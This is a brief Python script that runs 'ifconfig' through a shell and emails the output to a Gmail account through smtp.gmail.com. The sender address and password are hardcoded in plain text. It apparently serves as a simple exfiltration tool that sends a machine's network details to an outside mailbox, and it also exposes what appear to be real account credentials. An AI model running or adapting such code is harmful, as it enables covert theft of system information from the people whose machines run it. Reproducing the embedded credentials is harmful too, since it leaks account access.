#!/usr/bin/env python

import subprocess,smtplib

def send_mail(mail,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(mail,password)
    server.sendmail(mail,mail,message)
    server.quit

command="ifconfig"
subprocess.Popen(command,shell=True)
result=subprocess.check_output(command,shell=True)
send_mail("naraindylano@gmail.com","TuTu19662@@2",result)